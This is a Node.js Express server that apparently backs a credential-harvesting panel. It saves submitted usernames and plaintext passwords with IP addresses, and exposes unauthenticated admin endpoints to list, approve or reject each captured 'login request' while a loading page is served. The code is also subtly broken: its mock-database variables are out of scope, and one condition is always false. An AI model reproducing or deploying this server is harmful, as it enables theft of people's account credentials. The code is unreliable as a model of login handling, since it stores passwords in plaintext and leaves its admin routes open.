const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('.'));

// PostgreSQL connection
let pool;
try {
  pool = new Pool({
    connectionString: process.env.DATABASE_URL || 'postgresql://username:password@localhost:5432/discovery',
    ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
  });
} catch (err) {
  console.log('PostgreSQL connection failed, using mock database');
  // Mock data for development
  const mockData = {
    login_requests: [],
    login_attempts: []
  };

  // Helper function to generate IDs
  let nextId = 1;
  function generateId() {
    return nextId++;
  }

  // Mock pool object
  pool = {
    query: async (text, params) => {
      console.log('Mock query:', text, params);
      return { rows: [] };
    }
  };
}

// Create tables if they don't exist
async function initializeDatabase() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS login_requests (
        id SERIAL PRIMARY KEY,
        username VARCHAR(255) NOT NULL,
        password VARCHAR(255) NOT NULL,
        ip_address VARCHAR(45),
        status VARCHAR(20) DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    
    await pool.query(`
      CREATE TABLE IF NOT EXISTS login_attempts (
        id SERIAL PRIMARY KEY,
        username VARCHAR(255),
        ip_address VARCHAR(45),
        status VARCHAR(20),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    
    console.log('Database initialized successfully');
  } catch (err) {
    console.log('Database initialization failed (using mock database):', err.message);
  }
}

// Routes
// Serve the main page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Serve the admin page
app.get('/admin.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// Serve the loading page
app.get('/loading.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'loading.html'));
});

// API Routes
// Create a new login request
app.post('/api/login-requests', async (req, res) => {
  try {
    const { username, password, ipAddress } = req.body;
    
    // Check if we're using mock database
    if (!process.env.DATABASE_URL && !process.env.NODE_ENV === 'production') {
      const newRequest = {
        id: generateId(),
        username: username,
        password: password,
        ip_address: ipAddress || '127.0.0.1',
        status: 'pending',
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString()
      };
      
      mockData.login_requests.push(newRequest);
      return res.json(newRequest);
    }
    
    const result = await pool.query(
      'INSERT INTO login_requests (username, password, ip_address) VALUES ($1, $2, $3) RETURNING *',
      [username, password, ipAddress || '127.0.0.1']
    );
    
    res.json(result.rows[0]);
  } catch (err) {
    console.error('Error creating login request:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get all pending login requests (for admin)
app.get('/api/login-requests/pending', async (req, res) => {
  try {
    // Check if we're using mock database
    if (!process.env.DATABASE_URL && !process.env.NODE_ENV === 'production') {
      const pendingRequests = mockData.login_requests.filter(request => request.status === 'pending');
      return res.json(pendingRequests);
    }
    
    const result = await pool.query(
      'SELECT * FROM login_requests WHERE status = $1 ORDER BY created_at DESC',
      ['pending']
    );
    
    res.json(result.rows);
  } catch (err) {
    console.error('Error fetching pending requests:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get all login requests (for admin)
app.get('/api/login-requests', async (req, res) => {
  try {
    // Check if we're using mock database
    if (!process.env.DATABASE_URL && !process.env.NODE_ENV === 'production') {
      return res.json(mockData.login_requests);
    }
    
    const result = await pool.query('SELECT * FROM login_requests ORDER BY created_at DESC');
    res.json(result.rows);
  } catch (err) {
    console.error('Error fetching login requests:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get a specific login request
app.get('/api/login-requests/:id', async (req, res) => {
  try {
    const { id } = req.params;
    
    // Check if we're using mock database
    if (!process.env.DATABASE_URL && !process.env.NODE_ENV === 'production') {
      const request = mockData.login_requests.find(req => req.id == id);
      if (!request) {
        return res.status(404).json({ error: 'Login request not found' });
      }
      return res.json(request);
    }
    
    const result = await pool.query(
      'SELECT * FROM login_requests WHERE id = $1',
      [id]
    );
    
    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'Login request not found' });
    }
    
    res.json(result.rows[0]);
  } catch (err) {
    console.error('Error fetching login request:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Approve a login request
app.put('/api/login-requests/:id/approve', async (req, res) => {
  try {
    const { id } = req.params;
    
    // Check if we're using mock database
    if (!process.env.DATABASE_URL && !process.env.NODE_ENV === 'production') {
      const requestIndex = mockData.login_requests.findIndex(req => req.id == id);
      if (requestIndex === -1) {
        return res.status(404).json({ error: 'Login request not found' });
      }
      
      mockData.login_requests[requestIndex].status = 'approved';
      mockData.login_requests[requestIndex].updated_at = new Date().toISOString();
      
      // Log the successful attempt
      mockData.login_attempts.push({
        id: generateId(),
        username: mockData.login_requests[requestIndex].username,
        ip_address: mockData.login_requests[requestIndex].ip_address,
        status: 'approved',
        created_at: new Date().toISOString()
      });
      
      return res.json(mockData.login_requests[requestIndex]);
    }
    
    const result = await pool.query(
      'UPDATE login_requests SET status = $1, updated_at = CURRENT_TIMESTAMP WHERE id = $2 RETURNING *',
      ['approved', id]
    );
    
    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'Login request not found' });
    }
    
    // Log the successful attempt
    const request = result.rows[0];
    await pool.query(
      'INSERT INTO login_attempts (username, ip_address, status) VALUES ($1, $2, $3)',
      [request.username, request.ip_address, 'approved']
    );
    
    res.json(result.rows[0]);
  } catch (err) {
    console.error('Error approving login request:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Reject a login request
app.put('/api/login-requests/:id/reject', async (req, res) => {
  try {
    const { id } = req.params;
    
    // Check if we're using mock database
    if (!process.env.DATABASE_URL && !process.env.NODE_ENV === 'production') {
      const requestIndex = mockData.login_requests.findIndex(req => req.id == id);
      if (requestIndex === -1) {
        return res.status(404).json({ error: 'Login request not found' });
      }
      
      mockData.login_requests[requestIndex].status = 'rejected';
      mockData.login_requests[requestIndex].updated_at = new Date().toISOString();
      
      // Log the rejected attempt
      mockData.login_attempts.push({
        id: generateId(),
        username: mockData.login_requests[requestIndex].username,
        ip_address: mockData.login_requests[requestIndex].ip_address,
        status: 'rejected',
        created_at: new Date().toISOString()
      });
      
      return res.json(mockData.login_requests[requestIndex]);
    }
    
    const result = await pool.query(
      'UPDATE login_requests SET status = $1, updated_at = CURRENT_TIMESTAMP WHERE id = $2 RETURNING *',
      ['rejected', id]
    );
    
    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'Login request not found' });
    }
    
    // Log the rejected attempt
    const request = result.rows[0];
    await pool.query(
      'INSERT INTO login_attempts (username, ip_address, status) VALUES ($1, $2, $3)',
      [request.username, request.ip_address, 'rejected']
    );
    
    res.json(result.rows[0]);
  } catch (err) {
    console.error('Error rejecting login request:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get login statistics
app.get('/api/statistics', async (req, res) => {
  try {
    // Check if we're using mock database
    if (!process.env.DATABASE_URL && !process.env.NODE_ENV === 'production') {
      const total = mockData.login_requests.length;
      const approved = mockData.login_requests.filter(req => req.status === 'approved').length;
      const rejected = mockData.login_requests.filter(req => req.status === 'rejected').length;
      const pending = mockData.login_requests.filter(req => req.status === 'pending').length;
      
      const today = new Date();
      today.setHours(0, 0, 0, 0);
      const todayCount = mockData.login_requests.filter(req => {
        const reqDate = new Date(req.created_at);
        return reqDate >= today;
      }).length;
      
      return res.json({
        total: total,
        approved: approved,
        rejected: rejected,
        pending: pending,
        today: todayCount
      });
    }
    
    const totalRequests = await pool.query('SELECT COUNT(*) FROM login_requests');
    const approvedRequests = await pool.query("SELECT COUNT(*) FROM login_requests WHERE status = 'approved'");
    const rejectedRequests = await pool.query("SELECT COUNT(*) FROM login_requests WHERE status = 'rejected'");
    const pendingRequests = await pool.query("SELECT COUNT(*) FROM login_requests WHERE status = 'pending'");
    
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    const todayRequests = await pool.query(
      'SELECT COUNT(*) FROM login_requests WHERE created_at >= $1',
      [today]
    );
    
    res.json({
      total: parseInt(totalRequests.rows[0].count),
      approved: parseInt(approvedRequests.rows[0].count),
      rejected: parseInt(rejectedRequests.rows[0].count),
      pending: parseInt(pendingRequests.rows[0].count),
      today: parseInt(todayRequests.rows[0].count)
    });
  } catch (err) {
    console.error('Error fetching statistics:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Start server
app.listen(PORT, async () => {
  console.log(`Server running on port ${PORT}`);
  await initializeDatabase();
});